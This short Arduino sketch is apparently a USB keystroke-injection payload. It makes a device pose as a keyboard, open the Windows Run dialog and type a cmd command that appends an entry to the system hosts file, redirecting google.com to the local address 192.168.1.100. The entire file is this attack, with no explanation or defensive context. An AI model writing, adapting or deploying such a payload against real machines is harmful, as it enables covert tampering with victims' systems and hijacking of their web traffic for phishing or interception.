#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("cmd /c echo 192.168.1.100 google.com >> %WINDIR%\\System32\\drivers\\etc\\hosts");
}

void loop() {}
